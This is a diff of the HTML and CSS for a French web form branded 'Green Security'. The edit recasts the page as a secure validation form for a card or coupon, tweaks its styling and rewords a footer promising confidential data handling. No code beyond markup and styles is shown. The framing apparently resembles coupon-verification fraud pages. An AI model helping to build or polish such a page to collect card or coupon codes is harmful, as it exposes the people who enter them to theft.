@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Green Security - Formulaire de vérification</title>
-  <meta name="description" content="Formulaire de vérification sécurisé pour Green Security.">
+  <meta name="description" content="Formulaire sécurisé de validation pour carte ou coupon - Green Security">
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:;">
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <style>
@@ -31,7 +31,7 @@
       max-width: 600px;
       margin: 30px auto;
       background: white;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
       border-radius: 10px;
     }
 
@@ -46,9 +46,9 @@
     }
 
     input[type="text"],
-    input[type="email"],
     input[type="date"],
     input[type="time"],
+    input[type="email"],
     input[type="submit"] {
       padding: 10px;
       margin-top: 5px;
@@ -62,7 +62,7 @@
       color: white;
       cursor: pointer;
       margin-top: 20px;
-      transition: background 0.3s;
+      transition: background-color 0.3s;
     }
 
     input[type="submit"]:hover {
@@ -81,11 +81,20 @@
       height: 30px;
       margin: 10px;
       opacity: 0.8;
-      transition: opacity 0.3s;
+      transition: 0.3s;
     }
 
     footer img:hover {
       opacity: 1;
+    }
+
+    a {
+      color: #00ff99;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
     }
 
     @media (max-width: 600px) {
@@ -130,11 +139,15 @@
   <footer>
     <div>
       <h3 style="color: #00ff99;">Mentions légales & Conditions</h3>
-      <p>Ce site est édité par Green Security. L’utilisation du formulaire implique l’acceptation des conditions générales. Les données saisies sont traitées de manière confidentielle et sécurisée.</p>
+      <p>
+        Ce site est édité par Green Security.<br>
+        L’utilisation du formulaire implique l’acceptation des conditions générales.
+        Vos données sont traitées de manière confidentielle et sécurisée.
+      </p>
       <p>Toute tentative de fraude ou d’abus peut entraîner des sanctions légales.</p>
       <p>
-        <a href="mentions.html" style="color:#00ff99;">Mentions légales</a> |
-        <a href="conditions.html" style="color:#00ff99;">Conditions d’utilisation</a>
+        <a href="mentions.html">Mentions légales</a> |
+        <a href="conditions.html">Conditions d’utilisation</a>
       </p>
     </div>
     <hr style="margin: 20px 0; border-color: #333;">
